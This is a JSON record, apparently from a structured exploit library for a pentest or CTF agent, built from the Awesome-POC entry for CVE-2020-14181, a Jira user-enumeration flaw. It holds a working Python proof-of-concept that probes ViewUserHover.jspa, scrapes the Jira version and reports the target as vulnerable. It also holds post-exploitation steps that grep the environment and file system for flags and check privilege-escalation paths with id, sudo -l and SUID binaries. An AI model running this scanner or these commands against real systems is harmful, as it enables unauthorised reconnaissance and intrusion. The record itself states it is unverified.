{"id": "awesome-poc:cve-2020-14181:2", "kind": "poc", "title": "Atlassian Jira ViewUserHover.jspa 用户信息泄露漏洞 CVE-2020- 14181 (CVE-2020-14181)", "technique": "unknown", "summary": "Web应用漏洞 / CVE-2020-14181。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2020-14181 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2020-14181"], "payload_template": "import requests\nimport sys\nimport random\nimport re\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m')\n    print('+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m')\n    print('+  \\033[34mVersion: Atlassian Jira < 7.13.6                                   \\033[0m')\n    print('+  \\033[34mVersion: Atlassian Jira 8.0.0 - 8.5.7                              \\033[0m')\n    print('+  \\033[34mVersion: Atlassian Jira 8.6.0 - 8.12.0                             \\033[0m')\n    print('+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m')\n    print('+  \\033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \\033[0m')\n    print('+------------------------------------------')\n\ndef POC_1(target_url):\n    vuln_url = target_url + \"/secure/ViewUserHover.jspa?username=peiqipeiqipeiqi\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\n    }\n    try:\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)\n        version = re.findall(r'<span id=\"footer-build-information\">\\((.*?)#', response.text)[0]\n        print(\"\\033[32m[o] 目标 Jira 版本为{} \\033[0m\".format(version))\n        if \"peiqipeiqipeiqi\" in response.text:\n            print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url))\n        else:\n            print(\"\\033[31m[x] 目标不存在漏洞 \\033[0m\")\n            sys.exit(0)\n    except Exception as e:\n        print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n\nif __name__ == '__main__':\n    title()\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\"))\n    POC_1(target_url)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2020-14181 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 Web应用漏洞/Atlassian Jira ViewUserHover.jspa 用户信息泄露漏洞 CVE-2020-14181.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
